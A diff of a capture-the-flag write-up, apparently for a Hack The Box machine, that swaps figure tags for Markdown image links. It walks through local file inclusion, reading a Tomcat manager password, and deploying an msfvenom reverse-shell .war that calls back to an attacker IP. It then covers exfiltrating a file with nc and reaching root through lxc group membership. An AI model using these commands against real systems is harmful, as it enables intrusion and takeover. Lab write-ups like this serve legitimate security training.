@@ -4,23 +4,23 @@
 
 Nmap scan:
 
-<figure><img src="../../../.gitbook/assets/image (3145).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3145).png>)
 
 ### LFI
 
 We would have to add `megahosting.htb` to our `/etc/hosts` file to view port 80. Afterwards, we would just see something like this on the page:
 
-<figure><img src="../../../.gitbook/assets/image (1948).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1948).png>)
 
 When we press the Compare button, we would be brought to `/news.php?file=statement`. I tested for LFI, and it worked!
 
-<figure><img src="../../../.gitbook/assets/image (2961).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2961).png>)
 
 ### Tomcat
 
 Tomcat was running on port 8080, and we would need to somehow get the manager password to upload a .war reverse shell. Since we have LFI, we can read it at `/usr/share/tomcat9/etc/tomcat-users.xml`.
 
-<figure><img src="../../../.gitbook/assets/image (3618).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3618).png>)
 
 The password is `$3cureP4s5w0rd123!`. Then, we can login to the admin dashboard, create a .war reverse shell using `msfvenom`, upload it, and execute it via `curl`:
 
@@ -29,7 +29,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.9 LPORT=4444 -f war -o rev
 curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/mnager/text/deploy?path=/shell --upload-file rev.war
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3551).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3551).png>)
 
 ## Privilege Escalation
 
@@ -37,21 +37,21 @@ curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/mnager/text/deploy?
 
 When looking aroun the file system, I found this backup file here:
 
-<figure><img src="../../../.gitbook/assets/image (1606).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1606).png>)
 
 This waws password protected, so let's transfer this back to our machine via `nc` and then use `john` on it:
 
-<figure><img src="../../../.gitbook/assets/image (1808).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1808).png>)
 
 The backup file had nothing on it...which was weird. Since we have a password, might as well try `su`, and it worked to getting to `ash`:
 
-<figure><img src="../../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(250).png>)
 
 ### LXC Group
 
 When we check the `id` of `ash`, we see that they are part of the `lxc` group.
 
-<figure><img src="../../../.gitbook/assets/image (2401).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2401).png>)
 
 This exploitable because we can create a container and mount it with root access to the main machine.
 
@@ -59,6 +59,6 @@ This exploitable because we can create a container and mount it with root access
 
 Following the resource above, we can spawn a root shell:
 
-<figure><img src="../../../.gitbook/assets/image (2785).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2785).png>)
 
 Rooted!
